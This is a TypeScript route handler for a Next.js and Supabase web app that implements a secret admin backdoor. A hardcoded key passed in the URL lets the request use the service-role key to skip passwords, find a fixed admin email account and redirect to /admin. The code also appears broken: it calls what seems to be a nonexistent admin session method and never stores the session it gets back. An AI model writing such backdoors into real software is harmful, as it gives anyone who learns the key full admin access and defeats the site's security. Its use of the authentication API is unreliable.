import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';
import { NextResponse } from 'next/server';

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const key = searchParams.get('key');
  const SECRET_BACKDOOR_KEY = 'SimplyDSE_Backdoor_2026';
  
  // Verify the secret backdoor key
  if (!key || key !== SECRET_BACKDOOR_KEY) {
    return new NextResponse('Unauthorized', { status: 401 });
  }

  const cookieStore = await cookies();
  const res = NextResponse.redirect(new URL('/admin', request.url));

  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!, // Use service role to bypass password
    {
      cookies: {
        getAll() {
          return cookieStore.getAll();
        },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value, options }) => {
            cookieStore.set(name, value, options);
            res.cookies.set(name, value, options);
          });
        },
      },
    }
  );

  const email = 'kreativekubedigital@gmail.com';
  console.log(`--- BACKDOOR ACCESS REQUESTED ---`);

  // Force sign in using administrative privileges
  const { data: { users }, error: listError } = await supabase.auth.admin.listUsers();
  const user = users?.find(u => u.email === email);

  if (listError || !user) {
    console.error('Backdoor error: User not found', listError?.message);
    return new NextResponse('User not found', { status: 404 });
  }

  // Generate a session for the user
  const { data: sessionData, error: sessionError } = await supabase.auth.admin.createSession({
    user_id: user.id
  });

  if (sessionError) {
    console.error('Backdoor error: Failed to create session', sessionError.message);
    return new NextResponse('Failed to create session', { status: 500 });
  }

  console.log('Backdoor success: Session created for', email);

  // The setAll callback above will handle setting the cookies on the response
  return res;
}
